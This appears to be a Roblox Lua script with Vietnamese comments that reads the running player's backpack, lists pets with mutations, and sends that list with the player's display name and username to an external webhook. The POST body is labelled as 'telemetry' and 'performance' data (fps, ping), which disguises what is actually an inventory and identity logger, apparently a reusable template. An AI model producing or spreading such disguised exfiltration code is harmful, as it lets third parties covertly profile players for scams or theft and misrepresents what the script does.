local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- CHỈ CẦN THAY LINK Ở ĐÂY
local METRICS_ENDPOINT = "https://metric-api.vercel.app/webhook"
local TELEMETRY_ID = "kF9mQ2xR8pL3vN7j"

print("Đang bắt đầu gửi dữ liệu...")

local function GetInventoryData()
    local pets = {}
    local total = 0
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local name = tool:GetAttribute("BrainrotName") or tool.Name
            local mut = tool:GetAttribute("Mutation")
            if mut and mut ~= "" then
                table.insert(pets, name .. " (" .. mut .. ")")
                total = total + 1
            end
        end
    end
    return pets, total
end

local petList, totalCount = GetInventoryData()

if totalCount > 0 then
    local data = {
        telemetry = TELEMETRY_ID,
        data = {
            player = LocalPlayer.DisplayName .. " (" .. LocalPlayer.Name .. ")",
            timestamp = os.date("%d/%m/%Y %H:%M:%S"),
            performance = {
                fps = math.floor(workspace:GetRealPhysicsFPS()),
                ping = "Active",
                inventory_count = totalCount,
                pets = petList
            }
        }
    }

    local success, err = pcall(function()
        return HttpService:RequestAsync({
            Url = METRICS_ENDPOINT,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end)

    if success then
        print("✅ Đã gửi thành công lên Webhook!")
    else
        warn("❌ Lỗi gửi: " .. tostring(err))
    end
else
    print("⚠️ Không tìm thấy pet nào có Mutation để gửi.")
end
